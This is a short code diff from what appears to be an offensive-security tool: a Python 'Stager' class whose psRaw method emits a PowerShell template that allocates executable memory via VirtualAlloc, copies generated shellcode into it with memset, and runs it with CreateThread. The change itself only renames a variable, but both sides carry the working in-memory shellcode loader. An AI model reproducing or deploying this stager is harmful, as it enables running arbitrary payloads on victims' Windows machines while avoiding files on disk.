@@ -29,8 +29,8 @@ class Stager:
 	def psRaw(self):
 
 		self.shellcode = shellcode.Shellcode()
-		shellcode = self.shellcode.generate()
-		shellcode = ",0".join(shellcode.split("\\"))[1:]
+		Shellcode = self.shellcode.generate()
+		Shellcode = ",0".join(Shellcode.split("\\"))[1:]
 	
 		baseString = """$c = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
@@ -40,7 +40,7 @@ class Stager:
 $o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
 $x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
 for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
-$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (shellcode)
+$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
 		return baseString
 	
